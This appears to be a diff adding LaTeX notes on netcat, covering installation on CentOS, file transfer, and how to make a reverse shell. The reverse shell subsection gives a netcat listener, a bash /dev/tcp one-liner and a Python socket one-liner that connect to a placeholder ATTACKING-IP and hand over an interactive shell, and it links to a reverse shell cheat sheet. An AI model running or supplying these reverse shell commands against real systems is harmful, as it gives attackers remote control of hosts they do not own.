@@ -1,0 +1,45 @@
+\section{netcat}
+
+Netcat is a featured networking utility which reads and writes data across
+network connections, using the TCP/IP protocol.
+
+\subsection{installation}
+
+\begin{verbatim}
+yum erase nc
+wget http://vault.centos.org/6.6/os/x86_64/Packages/nc-1.84-22.el6.x86_64.rpm
+rpm -iUv nc-1.84-22.el6.x86_64.rpm
+\end{verbatim}
+
+\subsection{file transfer}
+\begin{verbatim}
+receiver# nc -l 1236 > file_to_receive
+sender#nc $receiver_ip 1236 < file_to_send
+\end{verbatim}
+
+\subsection{making a reverse shell}
+On source host, start a netcat listening on some port:
+\begin{verbatim}
+nc -l ATTACKING-IP 80
+\end{verbatim}
+ATTACKING-IP can be ommited.
+
+On target host, connect to this port:
+\begin{verbatim}
+bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
+\end{verbatim}
+
+Now the source host can execute any command on the target.
+
+This can set up a communication channel by which the source can send messages to
+the target.
+\begin{lstlisting}
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+\end{lstlisting}
+
+Here is a \href{https://highon.coffee/blog/reverse-shell-cheat-sheet/}{reverse
+shell cheatsheet} for other techniques.
+
+
+
+
